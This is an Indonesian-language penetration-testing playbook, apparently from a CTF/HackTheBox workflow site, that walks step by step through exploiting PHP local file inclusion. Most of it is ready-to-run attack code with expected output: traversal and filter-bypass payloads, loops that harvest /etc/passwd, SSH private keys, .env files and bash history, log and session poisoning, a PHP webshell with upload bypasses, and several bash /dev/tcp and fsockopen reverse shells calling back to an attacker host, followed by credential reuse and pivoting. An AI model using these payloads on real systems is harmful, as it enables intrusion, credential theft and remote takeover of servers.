**OUTPUT BERHASIL ✅ — LFI CONFIRMED:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user:x:1000:1000:,,,:/home/user:/bin/bash
```

**Cara baca /etc/passwd — SIMPAN SEMUA INI:**

| Field | Contoh | Yang Dicari |
|---|---|---|
| Username | `user`, `svc_web` | → Kandidat username untuk SSH/login |
| UID 0 | `root:x:0:` | Root user |
| Home dir | `/home/user` | → Cari SSH key di sini! |
| Shell `/bin/bash` | Login shell | → User ini bisa login interaktif |
| Shell `/usr/sbin/nologin` | Non-login | → Skip untuk SSH attempt |

```bash
# Simpan dan parse otomatis
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../etc/passwd" \
     > ~/lfi_loot/etc_passwd.txt

# Ekstrak username yang bisa login
grep "/bin/bash\|/bin/sh\|/bin/zsh" ~/lfi_loot/etc_passwd.txt | cut -d: -f1 \
     > ~/lfi_loot/creds/valid_users.txt

echo "[*] Users with login shell:"
cat ~/lfi_loot/creds/valid_users.txt
```

**OUTPUT BERHASIL ✅ — LFI tapi file kosong / error di response:**
```
Warning: include(../../../../etc/passwd): Failed to open stream
```
➡️ Error terlihat tapi belum dapat isi file → ada filter. Lanjut ke **Langkah 2.2 (Bypass)**

**OUTPUT GAGAL ❌ — Halaman sama persis, tidak ada perubahan:**
```
(output identik dengan halaman normal)
```
➡️ Parameter ini tidak vulnerable. Cari parameter lain atau cek POST/Cookie.

---

### Langkah 2.2 — LFI Test (Windows)

```bash
# Test Windows files — gunakan ini jika OS = Windows
# Test 1: win.ini (selalu ada di semua Windows)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../windows/win.ini"

# Test 2: dengan backslash (Windows path separator)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=..\\..\\..\\windows\\win.ini"

# Test 3: hosts file
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../windows/system32/drivers/etc/hosts"

# Test 4: Absolute path Windows
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=C:\\Windows\\win.ini"
```

**OUTPUT BERHASIL ✅ — Windows LFI:**
```
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
```
➡️ Windows LFI confirmed! Target file selanjutnya:
```bash
# IIS web config (sering ada DB creds)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../inetpub/wwwroot/web.config"

# Cari flag CTF langsung
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../Users/Administrator/Desktop/flag.txt"
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../Users/Administrator/Desktop/root.txt"
```

---

### Langkah 2.3 — Filter Bypass (Jika Basic Test Gagal)

```bash
# Bypass 1: URL encoding
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Bypass 2: Double URL encoding
curl "http://$TARGET/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Bypass 3: Filter mengapus "../" satu kali → gunakan ....//
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=....//....//....//etc/passwd"

# Bypass 4: Filter mengapus "../" → variasi lain
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=..././..././..././etc/passwd"

# Bypass 5: Null byte (PHP < 5.3.4)
curl "http://$TARGET/index.php?page=../../../../etc/passwd%00"

# Bypass 6: Absolute path langsung (jika filter fokus ke "../" saja)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=/etc/passwd"
```

**OUTPUT BERHASIL ✅ — Salah satu bypass berhasil:**
```
root:x:0:0:root:/root:/bin/bash
```
➡️ **Catat bypass mana yang berhasil** lalu lanjut ke Fase 3!  
➡️ Simpan bypass technique: `export LFI_BYPASS="....//"`

**OUTPUT GAGAL ❌ — Semua bypass gagal:**
```
(halaman error atau kosong untuk semua payload)
```
➡️ Kemungkinan ada WAF atau validasi ketat. Coba:
```bash
# Cek apakah ada prefix yang ditambahkan oleh aplikasi
# Misal: include("pages/" . $input) → harus prefix traversal
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../../../etc/passwd"

# Jika ada suffix yang ditambahkan (.php) → null byte atau cari alternative
# Misal: include($input . ".php") → coba wrapper
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=php://filter/convert.base64-encode/resource=/etc/passwd"
```

> 🔍 **Jika masih buntu → Google search:** `site:github.com LFI bypass [framework name] [PHP version]`  
> Contoh: `site:github.com LFI bypass Laravel PHP 8`

---

## ═══════════════════════════════════════
## FASE 3: SENSITIVE FILE COLLECTION
## ═══════════════════════════════════════

> **Tujuan:** Kumpulkan SEMUA file sensitif secepat mungkin. Jangan fokus ke RCE dulu sebelum exhaust informasi yang tersedia.

### Langkah 3.1 — Linux File Harvesting (Jalankan Semua)

```bash
# Buat helper function untuk LFI reading
lfi_read() {
    curl -sG "http://$TARGET/index.php" \
         --data-urlencode "page=$1" 2>/dev/null
}

# === TIER 1: WAJIB DIBACA (Selalu lakukan ini) ===

# 1. User enumeration
lfi_read "../../../../etc/passwd" | tee ~/lfi_loot/etc_passwd.txt
lfi_read "../../../../etc/hosts" | tee ~/lfi_loot/etc_hosts.txt
lfi_read "../../../../etc/hostname" | tee ~/lfi_loot/hostname.txt

# 2. Process info (sering ada secrets di environ)
lfi_read "../../../../proc/self/environ" | tr '\0' '\n' | tee ~/lfi_loot/environ.txt
lfi_read "../../../../proc/self/cmdline" | tr '\0' ' ' | tee ~/lfi_loot/cmdline.txt

# 3. Web application config (sering ada DB creds)
lfi_read "../../../../var/www/html/config.php" | tee ~/lfi_loot/source/config.php
lfi_read "../../../../var/www/html/.env" | tee ~/lfi_loot/source/env.txt
lfi_read "../../../../var/www/html/wp-config.php" | tee ~/lfi_loot/source/wp-config.php
lfi_read "../../../../var/www/html/configuration.php" | tee ~/lfi_loot/source/joomla_config.php

# 4. SSH Keys — gunakan user yang ditemukan dari /etc/passwd
for user in $(cat ~/lfi_loot/creds/valid_users.txt); do
    echo "[*] Trying SSH key for $user"
    lfi_read "/home/$user/.ssh/id_rsa" | tee ~/lfi_loot/creds/${user}_id_rsa.txt
    lfi_read "/home/$user/.ssh/authorized_keys" | tee ~/lfi_loot/creds/${user}_auth_keys.txt
    lfi_read "/home/$user/.bash_history" | tee ~/lfi_loot/creds/${user}_bash_history.txt
done

# Root SSH key
lfi_read "../../../../root/.ssh/id_rsa" | tee ~/lfi_loot/creds/root_id_rsa.txt

echo "[*] File collection complete. Check ~/lfi_loot/"
```

**OUTPUT BERHASIL ✅ — SSH private key ditemukan:**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA...
-----END OPENSSH PRIVATE KEY-----
```
➡️ **JACKPOT! Simpan dan coba SSH langsung:**
```bash
# Simpan key
grep -A 9999 "BEGIN.*PRIVATE KEY" ~/lfi_loot/creds/user_id_rsa.txt \
     | grep -B 9999 "END.*PRIVATE KEY" > ~/lfi_loot/keys/id_rsa
chmod 600 ~/lfi_loot/keys/id_rsa

# Cek apakah ada passphrase
ssh-keygen -y -f ~/lfi_loot/keys/id_rsa
# Jika minta passphrase → crack: ssh2john ~/lfi_loot/keys/id_rsa | john --wordlist=/usr/share/wordlists/rockyou.txt

# Coba login
for user in $(cat ~/lfi_loot/creds/valid_users.txt); do
    ssh -i ~/lfi_loot/keys/id_rsa -o StrictHostKeyChecking=no $user@$TARGET 2>/dev/null &
done
# → Jika berhasil, lanjut ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

**OUTPUT BERHASIL ✅ — Credential ditemukan di .env atau config:**
```
DB_HOST=localhost
DB_DATABASE=webapp
DB_USERNAME=admin
DB_PASSWORD=Sup3rS3cr3t!
APP_KEY=base64:xxxxxx
```
➡️ **Simpan credentials:**
```bash
export DB_USER="admin"
export DB_PASS="Sup3rS3cr3t!"
echo "$DB_USER:$DB_PASS" >> ~/lfi_loot/creds/found_creds.txt

# Test credential ke service lain
nxc ssh $TARGET -u "$DB_USER" -p "$DB_PASS"      # SSH
nxc ftp $TARGET -u "$DB_USER" -p "$DB_PASS"      # FTP
mysql -h $TARGET -u "$DB_USER" -p"$DB_PASS"       # MySQL → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
```

**OUTPUT GAGAL ❌ — File kosong / permission denied:**
```
(empty response atau PHP error)
```
➡️ File tidak bisa dibaca langsung. Untuk PHP files → gunakan `php://filter`:
```bash
# PHP wrapper untuk bypass PHP execution dan baca source
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=php://filter/convert.base64-encode/resource=../../../../var/www/html/config.php" \
     | base64 -d
```

---

### Langkah 3.2 — Log File Discovery (Persiapan untuk Log Poisoning)

```bash
# Cek log yang bisa dibaca via LFI
# Apache logs
lfi_read "../../../../var/log/apache2/access.log" | head -5 | tee ~/lfi_loot/logs/apache_access.txt
lfi_read "../../../../var/log/apache2/error.log" | head -5 | tee ~/lfi_loot/logs/apache_error.txt

# Nginx logs
lfi_read "../../../../var/log/nginx/access.log" | head -5 | tee ~/lfi_loot/logs/nginx_access.txt
lfi_read "../../../../var/log/nginx/error.log" | head -5 | tee ~/lfi_loot/logs/nginx_error.txt

# Auth logs (SSH poisoning)
lfi_read "../../../../var/log/auth.log" | head -5 | tee ~/lfi_loot/logs/auth.txt

# Mail logs
lfi_read "../../../../var/log/mail.log" | head -5 | tee ~/lfi_loot/logs/mail.txt
```

**OUTPUT BERHASIL ✅ — Apache log terbaca:**
```
10.10.14.5 - - [12/Sep/2024:10:23:45 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
10.10.14.5 - - [12/Sep/2024:10:23:46 +0000] "GET /index.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
```
➡️ **Log bisa dibaca!** Catat path-nya → **Lanjut ke FASE 5 (Log Poisoning)**

**OUTPUT GAGAL ❌ — Log tidak bisa dibaca:**
```
(empty response)
```
➡️ Log di-protect atau path berbeda. Coba:
```bash
# Cari path log alternatif
lfi_read "../../../../var/log/httpd/access_log"      # CentOS/RHEL
lfi_read "../../../../usr/local/apache/log/access_log" # Custom Apache
lfi_read "../../../../proc/self/fd/1"                # stdout process
lfi_read "../../../../proc/self/fd/2"                # stderr process
```

---

## ═══════════════════════════════════════
## FASE 4: PHP SOURCE CODE DISCLOSURE
## ═══════════════════════════════════════

> **Tujuan:** Baca source code PHP untuk temukan: DB credentials, secret keys, hidden endpoints, authentication logic, upload paths.

### Langkah 4.1 — php://filter Source Disclosure

```bash
# Template command untuk baca source PHP (ganti FILENAME)
lfi_php_source() {
    curl -sG "http://$TARGET/index.php" \
         --data-urlencode "page=php://filter/convert.base64-encode/resource=$1" \
         | grep -oE '[A-Za-z0-9+/=]{20,}' \
         | base64 -d 2>/dev/null
}

# Baca file-file kritis satu per satu
echo "=== index.php ===" && lfi_php_source "index.php" | tee ~/lfi_loot/source/index.php
echo "=== config.php ===" && lfi_php_source "config.php" | tee ~/lfi_loot/source/config.php
echo "=== login.php ===" && lfi_php_source "login.php" | tee ~/lfi_loot/source/login.php
echo "=== admin.php ===" && lfi_php_source "admin.php" | tee ~/lfi_loot/source/admin.php
echo "=== db.php ===" && lfi_php_source "db.php" | tee ~/lfi_loot/source/db.php
echo "=== functions.php ===" && lfi_php_source "functions.php" | tee ~/lfi_loot/source/functions.php
echo "=== upload.php ===" && lfi_php_source "upload.php" | tee ~/lfi_loot/source/upload.php
```

**OUTPUT BERHASIL ✅ — Source code terbaca:**
```php
<?php
$db_host = "localhost";
$db_user = "webapp";
$db_pass = "DB_S3cr3t_P@ss!";
$db_name = "production_db";

$upload_dir = "/var/www/html/uploads/";
$allowed_ext = ["jpg", "png", "gif"];
```

➡️ **Apa yang harus dicari di source code:**
```bash
# Cari credentials
grep -iE "(password|passwd|pass|secret|key|token|api_key|db_pass)" \
     ~/lfi_loot/source/*.php

# Cari upload logic → kandidat untuk upload bypass
grep -iE "(move_uploaded_file|upload|file_put_contents|fwrite)" \
     ~/lfi_loot/source/*.php

# Cari include() logic → mungkin ada LFI lain yang lebih dalam
grep -iE "(include|require|include_once|require_once)" \
     ~/lfi_loot/source/*.php

# Cari hidden endpoints / admin paths
grep -iE "(href=|action=|route|url)" \
     ~/lfi_loot/source/*.php

# Cari eval() atau exec() → possible injection points
grep -iE "(eval|exec|system|passthru|shell_exec|popen|proc_open)" \
     ~/lfi_loot/source/*.php
```

**OUTPUT BERHASIL ✅ — Upload path ditemukan:**
```php
$upload_dir = "/var/www/html/uploads/";
// File check hanya cek ekstensi
if(!in_array($ext, $allowed_ext)) { die("Error"); }
```
➡️ Upload path ketahuan + ada bypass potential → **Lanjut ke Fase 6B (Upload + LFI)**

**OUTPUT GAGAL ❌ — Base64 output ada tapi tidak bisa di-decode:**
```
(output base64 terpotong atau ada HTML noise)
```
➡️ Strip HTML noise dulu:
```bash
# Method yang lebih robust
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=php://filter/convert.base64-encode/resource=config.php" \
     | sed 's/<[^>]*>//g' \
     | tr -d '\n ' \
     | base64 -d
```

---

### Langkah 4.2 — PHP Filter Chain (Saat Semua Cara Lain Gagal)

> Teknik ini untuk RCE **tanpa butuh file upload, log poisoning, atau external server.**

```bash
# SETUP: Clone tool dulu (sekali saja)
git clone https://github.com/synacktiv/php_filter_chain_generator ~/tools/php_filter_chain_generator
cd ~/tools/php_filter_chain_generator

# Step 1: Test apakah filter chain bekerja
python3 php_filter_chain_generator.py --chain '<?php echo "FILTER_CHAIN_OK"; ?>' \
    | tail -1 > ~/lfi_loot/payloads/test_chain.txt

# Test chain
CHAIN=$(cat ~/lfi_loot/payloads/test_chain.txt)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=$CHAIN"
```

**OUTPUT BERHASIL ✅ — Filter chain bekerja:**
```
FILTER_CHAIN_OK
```
➡️ **Filter chain aktif!** Generate reverse shell:
```bash
# Step 2: Generate reverse shell chain
python3 ~/tools/php_filter_chain_generator/php_filter_chain_generator.py \
    --chain "<?php system('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"'); ?>" \
    | tail -1 > ~/lfi_loot/payloads/revshell_chain.txt

# Step 3: Setup listener di terminal lain
nc -lvnp $LPORT &

# Step 4: Trigger
CHAIN=$(cat ~/lfi_loot/payloads/revshell_chain.txt)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=$CHAIN"
```

**OUTPUT BERHASIL ✅ — Shell didapat:**
```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.100] 54321
bash: cannot set terminal process group
www-data@target:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
➡️ **SHELL!** Lanjut ke **Fase 7 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — Chain terlalu panjang / 500 error:**
```
500 Internal Server Error
```
➡️ Payload terlalu panjang untuk GET. Coba via POST:
```bash
CHAIN=$(cat ~/lfi_loot/payloads/revshell_chain.txt)
curl -s "http://$TARGET/index.php" \
     -X POST \
     --data-urlencode "page=$CHAIN"
```

> 🔍 **Jika filter chain tidak bekerja → Google search:** `php filter chain bypass [PHP version] 2024`

---

## ═══════════════════════════════════════
## FASE 5: LOG POISONING → RCE
## ═══════════════════════════════════════

> **Prasyarat:** Log bisa dibaca via LFI (dari Langkah 3.2)  
> **Cara kerja:** Inject PHP code ke dalam log file → LFI membaca log → PHP mengeksekusi code

### Langkah 5.1 — Apache/Nginx Log Poisoning

```bash
# LOG PATH yang ditemukan dari Fase 3:
export LOG_PATH="../../../../var/log/apache2/access.log"  # Sesuaikan

# STEP 1: Inject PHP webshell ke User-Agent (masuk ke log)
curl -s \
     -A '<?php system($_GET["cmd"]); ?>' \
     "http://$TARGET/"

echo "[*] Payload injected ke log"

# STEP 2: Verifikasi injection berhasil masuk ke log
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=$LOG_PATH" | tail -5
```

**OUTPUT BERHASIL ✅ — PHP code terlihat di log:**
```
10.10.14.5 - - [12/Sep/2024] "GET / HTTP/1.1" 200 - "-" "<?php system($_GET["cmd"]); ?>"
```
➡️ Injection masuk! Sekarang eksekusi command:

```bash
# STEP 3: Execute command via LFI + poisoned log
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=$LOG_PATH" \
     --data-urlencode "cmd=id"
```

**OUTPUT BERHASIL ✅ — Command execution:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
➡️ **RCE via Log Poisoning!** Upgrade ke reverse shell:
```bash
# STEP 4: Setup listener
nc -lvnp $LPORT &

# STEP 5: Trigger reverse shell
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=$LOG_PATH" \
     --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

**OUTPUT GAGAL ❌ — PHP code di log tapi tidak dieksekusi (output raw):**
```
<?php system($_GET["cmd"]); ?>
```
➡️ Log dibaca tapi tidak di-include sebagai PHP (mungkin hanya `readfile()` bukan `include()`):
```bash
# Cek apakah ada parameter berbeda yang menggunakan include()
# Dari source code (Fase 4) cari include()
grep -n "include\|require" ~/lfi_loot/source/index.php
```

**OUTPUT GAGAL ❌ — Injection tidak masuk ke log (log tidak update):**
```
(log lama, tidak ada entry baru)
```
➡️ Mungkin log langsung ke syslog/journald atau web server berbeda. Coba:
```bash
# Coba inject via Referer header
curl -s \
     -H 'Referer: <?php system($_GET["cmd"]); ?>' \
     "http://$TARGET/"

# Coba inject via X-Forwarded-For
curl -s \
     -H 'X-Forwarded-For: <?php system($_GET["cmd"]); ?>' \
     "http://$TARGET/"
```

---

### Langkah 5.2 — SSH Log Poisoning (auth.log)

```bash
# Prasyarat: /var/log/auth.log bisa dibaca via LFI
export AUTH_LOG="../../../../var/log/auth.log"

# STEP 1: Inject PHP code sebagai SSH username
ssh '<?php system($_GET["cmd"]); ?>'@$TARGET 2>/dev/null
# (akan gagal login tapi username masuk ke auth.log)

# STEP 2: Trigger via LFI
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=$AUTH_LOG" \
     --data-urlencode "cmd=id"
```

**OUTPUT BERHASIL ✅:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**OUTPUT GAGAL ❌ — SSH menolak karakter khusus:**
```
ssh: Could not resolve hostname
```
➡️ OpenSSH modern menolak invalid usernames. Coba via `/proc/self/fd`:
```bash
# Cek file descriptor yang bisa dibaca
for i in $(seq 0 20); do
    result=$(curl -sG "http://$TARGET/index.php" --data-urlencode "page=../../../../proc/self/fd/$i" 2>/dev/null | head -1)
    [ -n "$result" ] && echo "FD $i: $result"
done
```

---

## ═══════════════════════════════════════
## FASE 6: LFI → RCE PATHS
## ═══════════════════════════════════════

### PATH A — php://input (Langsung RCE via POST body)

> Prasyarat: `allow_url_include = On` (dari phpinfo atau source code)

```bash
# Test php://input
curl -s \
     -X POST \
     "http://$TARGET/index.php?page=php://input" \
     --data '<?php echo "PHP_INPUT_OK"; ?>'
```

**OUTPUT BERHASIL ✅:**
```
PHP_INPUT_OK
```
➡️ Langsung buat reverse shell:
```bash
# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell
curl -s \
     -X POST \
     "http://$TARGET/index.php?page=php://input" \
     --data "<?php system('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"'); ?>"
```

**OUTPUT GAGAL ❌:**
```
(halaman normal, tidak ada output dari PHP code)
```
➡️ `allow_url_include` mungkin Off. Coba `data://`

---

### PATH B — data:// Wrapper

```bash
# Encode payload ke base64
PAYLOAD=$(printf '<?php system("id"); ?>' | base64 -w 0)
echo "[*] Payload: $PAYLOAD"

# Test data:// wrapper
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=data://text/plain;base64,$PAYLOAD"
```

**OUTPUT BERHASIL ✅:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
➡️ Buat reverse shell:
```bash
REVSHELL=$(printf "<?php system('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"'); ?>" | base64 -w 0)
nc -lvnp $LPORT &
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=data://text/plain;base64,$REVSHELL"
```

---

### PATH C — Upload + LFI Combo

> Prasyarat: Ada file upload endpoint (dari source code di Fase 4)

```bash
# STEP 1: Buat PHP webshell
cat > ~/lfi_loot/payloads/shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>
EOF

# STEP 2: Upload shell (sesuaikan endpoint dan field name)
curl -s \
     -F "file=@~/lfi_loot/payloads/shell.php;type=image/jpeg" \
     "http://$TARGET/upload.php"
```

**OUTPUT BERHASIL ✅ — Upload success, path diketahui:**
```json
{"success": true, "path": "/uploads/shell.php"}
```
➡️ Akses langsung via HTTP (bukan LFI):
```bash
curl "http://$TARGET/uploads/shell.php?cmd=id"
```

**OUTPUT BERHASIL ✅ — Upload success tapi extension diubah:**
```json
{"success": true, "path": "/uploads/shell.jpg"}
```
➡️ Extension diubah → gunakan LFI untuk include file ini:
```bash
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../var/www/html/uploads/shell.jpg" \
     --data-urlencode "cmd=id"
```

**OUTPUT GAGAL ❌ — Upload ditolak (wrong extension):**
```
Error: Only images allowed!
```
➡️ Bypass extension check:
```bash
# Bypass 1: Double extension
mv ~/lfi_loot/payloads/shell.php ~/lfi_loot/payloads/shell.php.jpg
curl -s -F "file=@~/lfi_loot/payloads/shell.php.jpg" "http://$TARGET/upload.php"

# Bypass 2: MIME type manipulation (di-handle oleh Fase [25 — File Upload Workflow](/docs/file-upload))
# → Lanjut ke <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a> untuk teknik bypass lengkap
```

---

### PATH D — Session File Poisoning

> Teknik ini untuk ketika session value dimasukkan ke dalam include

```bash
# STEP 1: Kirim PHP code sebagai nilai cookie/field yang disimpan di session
curl -s "http://$TARGET/login.php" \
     -d "username=<?php system('id'); ?>&password=test" \
     -c ~/lfi_loot/session.txt

# STEP 2: Ambil session ID dari cookie
SESSION_ID=$(grep PHPSESSID ~/lfi_loot/session.txt | awk '{print $7}')
echo "[*] Session ID: $SESSION_ID"

# STEP 3: Include session file via LFI
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../var/lib/php/sessions/sess_$SESSION_ID" \
     -b "PHPSESSID=$SESSION_ID"
```

**OUTPUT BERHASIL ✅:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## ═══════════════════════════════════════
## FASE 6B: RFI (REMOTE FILE INCLUSION)
## ═══════════════════════════════════════

> **Prasyarat:** `allow_url_include = On` + parameter vulnerable menerima URL remote  
> **Ciri RFI:** Aplikasi mengakses `http://` atau `ftp://` yang kamu kontrol

### Langkah 6B.1 — Deteksi RFI

```bash
# Setup web server dulu untuk menerima request
python3 -m http.server $WEBPORT &
echo "[*] HTTP Server: http://$LHOST:$WEBPORT"

# Test: apakah target mengakses server kita?
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=http://$LHOST:$WEBPORT/test.txt"

# Cek apakah ada request masuk ke HTTP server kita
# (lihat terminal http.server)
```

**OUTPUT BERHASIL ✅ — Request masuk ke server kita:**
```
10.10.11.100 - - [12/Sep/2024] "GET /test.txt HTTP/1.0" 404 -
```
➡️ **RFI CONFIRMED!** Target mengakses server kita. Buat payload:
```bash
# Buat PHP reverse shell di server kita
cat > /tmp/revshell.php << EOF
<?php
\$sock=fsockopen("$LHOST",$LPORT);
\$proc=proc_open("/bin/sh -i", array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$pipes);
?>
EOF

cp /tmp/revshell.php ~/lfi_loot/payloads/
cd ~/lfi_loot/payloads/

# Setup listener
nc -lvnp $LPORT &

# Trigger RFI
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=http://$LHOST:$WEBPORT/revshell.php"
```

**OUTPUT BERHASIL ✅ — Shell didapat:**
```
connect to [10.10.14.5] from 10.10.11.100
/bin/sh: 0: can't access tty
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**OUTPUT GAGAL ❌ — Tidak ada request masuk ke server kita:**
```
(http.server tidak mencatat request dari target)
```
➡️ `allow_url_include = Off` atau firewall blokir outbound. RFI tidak aktif.  
➡️ Kembali ke **Fase 4 (Filter Chain)** atau **Fase 5 (Log Poisoning)**

---

## ═══════════════════════════════════════
## FASE 7: POST-EXPLOITATION & PIVOT
## ═══════════════════════════════════════

### Langkah 7.1 — Stabilisasi Shell

```bash
# Setelah dapat shell www-data:
# Step 1: Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Step 2: Cek privilege
id
whoami
sudo -l      # Cek sudo rights → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
find / -perm -4000 -type f 2>/dev/null | head -10  # SUID → ke <a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>

# Step 3: Cari creds di filesystem
find /var/www -name "*.php" -exec grep -l "password\|passwd\|secret" {} \; 2>/dev/null
find /var/www -name ".env" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null \
     | xargs grep -iE "(pass|secret|key)" 2>/dev/null

# Step 4: Cek file lokal dan network
cat /etc/hosts
ss -tunp
arp -n
ip route
```

**OUTPUT BERHASIL ✅ — sudo -l menunjukkan privilege:**
```
(www-data) NOPASSWD: /usr/bin/python3
```
➡️ **Privesc via sudo!** Lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)**

**OUTPUT BERHASIL ✅ — Network internal terdeteksi:**
```
10.10.11.0/24 dev eth0
172.16.0.0/24 dev eth1   ← Internal network!
```
➡️ Ada double network → pivot! Lanjut ke **<a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>**

---

### Langkah 7.2 — Cross-Service Credential Reuse

Setelah dapat credentials dari LFI (config.php/.env), test ke service lain:

```
LFI Creds Found
     │
     ├──→ Port 22  (SSH)      → ssh user@$TARGET -p password
     ├──→ Port 21  (FTP)      → ftp $TARGET → ke <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
     ├──→ Port 80/443 (HTTP)  → Login ke admin panel / CMS
     ├──→ Port 3306 (MySQL)   → mysql -h $TARGET -u user -p → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ Port 5432 (PostgreSQL) → psql -h $TARGET -U user → ke <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
     ├──→ Port 6379 (Redis)   → redis-cli -h $TARGET → ke <a href="/docs/redis-and-mongodb" class="text-[#00b4d8] hover:underline font-mono font-semibold">14d_redis_mongodb_workflow.md</a>
     └──→ WordPress DB creds  → mysql login → change admin pass → login WP admin
```

```bash
# Test semua sekaligus
export FOUND_USER="admin"
export FOUND_PASS="Sup3rS3cr3t!"

nxc ssh $TARGET -u "$FOUND_USER" -p "$FOUND_PASS"
nxc ftp $TARGET -u "$FOUND_USER" -p "$FOUND_PASS"
mysql -h $TARGET -u "$FOUND_USER" -p"$FOUND_PASS" -e "show databases;" 2>/dev/null
```

---

## ═══════════════════════════════════════
## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA
## ═══════════════════════════════════════

| Error / Situasi | Penyebab | Solusi |
|---|---|---|
| Response sama persis, tidak berubah | Parameter bukan LFI / bukan file input | Fuzz parameter lain, cek POST/Cookie |
| PHP error tapi tidak ada isi file | Filter sanitize `../` | Coba bypass: `....//`, URL encode, absolute path |
| Response kosong untuk `/etc/passwd` | `open_basedir` restriction | Coba path relatif, atau cari file di dalam basedir |
| `php://filter` output kosong | Wrapper tidak didukung / file tidak ada | Cek nama file exact, coba dengan path absolute |
| Base64 output tapi decode gagal | HTML noise di sekitar base64 | `sed 's/<[^>]*>//g'` lalu pipe ke `base64 -d` |
| Log poisoning: log tidak bisa dibaca | Permission denied / path salah | Coba `/proc/self/fd/*`, path log alternatif |
| Log poisoning: PHP tidak dieksekusi | Hanya `readfile()` bukan `include()` | Perlu `include()` untuk eksekusi, cari endpoint lain |
| `php://input` tidak bekerja | `allow_url_include = Off` | Gunakan filter chain atau log poisoning |
| Filter chain 500 error | Payload terlalu panjang | Kirim via POST bukan GET |
| RFI tidak ada request masuk | `allow_url_include = Off` atau firewall | Fokus ke LFI path lain (filter chain, log) |
| Upload + LFI: extension diubah | MIME type check | Double extension, lihat [25 — File Upload Workflow](/docs/file-upload) |
| Session poisoning gagal | Session path berbeda | `php.ini` untuk cek `session.save_path` |
| Null byte bypass gagal | PHP > 5.3.4 | Teknik ini deprecated, gunakan wrapper/filter chain |
| WAF memblokir payload | Input filtering | Coba encoding ganda, filter chain (tidak terlihat seperti LFI biasa) |

> 🔍 **Google search template untuk error spesifik:**
> - `LFI to RCE [framework] [PHP version] 2024`
> - `bypass open_basedir restriction PHP LFI`
> - `LFI no log access no upload php filter chain`
